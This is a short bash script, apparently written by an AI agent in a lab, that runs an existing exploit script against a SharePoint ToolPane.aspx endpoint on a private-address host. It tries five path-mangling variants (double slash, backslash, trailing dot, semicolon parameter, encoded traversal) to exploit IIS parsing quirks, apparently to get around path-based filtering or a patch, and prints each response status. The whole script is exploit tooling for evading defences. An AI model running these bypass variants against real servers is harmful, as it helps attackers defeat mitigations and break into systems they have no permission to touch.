#!/bin/bash
# Test IIS-specific path parsing behaviors
echo "=== Double slash ==="
cp additional_resources/exploits/exploit.py ai_results/test_quirk_tmp.py
sed -i 's|/_layouts/15/ToolPane.aspx|//_layouts/15/ToolPane.aspx|g' ai_results/test_quirk_tmp.py
python3 ai_results/test_quirk_tmp.py --url http://10.10.10.166 2>&1 | grep "Status:"

echo "=== Backslash ==="
cp additional_resources/exploits/exploit.py ai_results/test_quirk_tmp.py
sed -i 's|/_layouts/15/ToolPane.aspx|/_layouts\\15\\ToolPane.aspx|g' ai_results/test_quirk_tmp.py
python3 ai_results/test_quirk_tmp.py --url http://10.10.10.166 2>&1 | grep "Status:"

echo "=== Trailing dot ==="
cp additional_resources/exploits/exploit.py ai_results/test_quirk_tmp.py
sed -i 's|/ToolPane.aspx|/ToolPane.aspx.|g' ai_results/test_quirk_tmp.py
python3 ai_results/test_quirk_tmp.py --url http://10.10.10.166 2>&1 | grep "Status:"

echo "=== Semicolon path parameter ==="
cp additional_resources/exploits/exploit.py ai_results/test_quirk_tmp.py
sed -i 's|/ToolPane.aspx|/ToolPane.aspx;foo=bar|g' ai_results/test_quirk_tmp.py
python3 ai_results/test_quirk_tmp.py --url http://10.10.10.166 2>&1 | grep "Status:"

echo "=== Encoded path traversal ==="
cp additional_resources/exploits/exploit.py ai_results/test_quirk_tmp.py
sed -i 's|/_layouts/15/ToolPane.aspx|/_layouts/15/%2e%2e/15/ToolPane.aspx|g' ai_results/test_quirk_tmp.py
python3 ai_results/test_quirk_tmp.py --url http://10.10.10.166 2>&1 | grep "Status:"
